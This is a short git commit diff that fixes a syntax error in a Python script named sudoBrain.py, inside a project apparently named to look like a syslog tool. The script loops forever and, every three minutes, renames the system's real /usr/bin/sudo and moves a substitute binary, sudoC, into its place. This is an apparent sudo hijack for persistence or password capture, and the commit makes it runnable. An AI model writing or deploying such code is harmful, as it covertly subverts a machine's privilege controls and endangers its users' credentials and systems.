a40c9a03fa9a59234ba0c8611815822f068d33da
Sam Burton <sam.burton271@gmail.com>
2024-03-27 16:07:12 -0400

    More syntax errors

--- syslogT/sudoBrain.py
+++ syslogT/sudoBrain.py
@@ -3,7 +3,7 @@ import time
 
 def main():
     while(True):
-        if(os.path.exists("/usr/bin/sudoC"):
+        if(os.path.exists("/usr/bin/sudoC")):
             os.system("mv /usr/bin/sudo /usr/bin/sudoA")
             os.system("mv /usr/bin/sudoC /usr/bin/sudo")
         time.sleep(180)
